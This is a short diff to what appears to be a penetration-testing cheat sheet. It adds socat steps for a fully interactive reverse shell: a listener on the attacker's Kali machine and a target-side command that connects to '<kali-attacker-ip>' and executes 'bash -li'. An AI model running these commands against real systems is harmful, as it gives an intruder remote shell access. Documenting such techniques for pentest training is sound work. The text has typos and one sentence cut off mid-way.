@@ -128,6 +128,15 @@ stty raw -echo; fg
 #### Technique 3: Socat
 Restricted to Linux target
 ```
+➤ Prerequisite: Obtain Socat on the linux target.
+
 ➤ Step 01: Transfer a socat static compiled binary (e.g., using python http.server)
-➤ Step 02: Use Socat
+
+➤ Step 02: On the Kali
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+➤ Step 03: execute the reverse shell on the target.
+
+➤ Step 04: Once connected to the target, execute the sepcial socal command in order to 
+socat TCP:<kali-attacker-ip>:<kali-attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
